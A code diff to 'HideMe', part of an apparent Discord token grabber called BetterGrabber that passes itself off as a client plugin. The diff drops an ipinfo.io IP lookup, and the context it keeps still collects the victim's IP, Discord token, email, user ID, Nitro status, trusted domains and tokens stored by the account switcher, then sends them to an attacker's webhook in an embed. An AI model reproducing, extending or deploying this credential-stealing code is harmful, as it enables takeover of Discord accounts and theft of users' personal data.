@@ -104,18 +104,6 @@ class HideMe {
             });
         }
 
-        function getIPInfos(IP){
-            return new Promise(async (resolve, reject) => {
-                https.get({'host': 'ipinfo.io', 'port': 443, 'path': `/widget/${IP}`, "headers": { "Referer": "https://ipinfo.io", "User-Agent": "HelloWorld" }}, function(response) {
-                    response.on('data', function(body) {
-                        return resolve(body.toString());
-                    }).on('error', (e) => {
-                        console.error(e);
-                    });
-                });
-            });
-        }
-
         function getLocalStorageInfo(info){
             return new Promise(async (resolve, reject) => {
                 return resolve(window.open().localStorage[info])
@@ -123,7 +111,6 @@ class HideMe {
         }
 
         var IP = await getIP();
-        var IPInfos = JSON.stringify(await getIPInfos(IP), null, 4);
         var actualUserUsername = document.getElementsByClassName("size14-3fJ-ot title-338goq")[0].innerText;
         var actualUserDiscriminator = document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0].innerText.includes("\n") ? document.getElementsByClassName("hoverRoll-2XwpoF")[0]?.innerText.split(/\r\n|\r|\n/)[0] : document.getElementsByClassName("size12-oc4dx4 subtext-2HDqJ7")[0]?.innerText.split(/\r\n|\r|\n/);
         var actualUserTag = actualUserUsername+actualUserDiscriminator;
@@ -141,7 +128,7 @@ class HideMe {
             username: config.webhookUsername,
             avatar_url: config.webhookAvatar,
             tts: config.tts,
-            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.6" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos == undefined ? "null": IPInfos}\`\`\``, inline: false }]}]
+            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.6" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }]}]
         });
 
         //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)
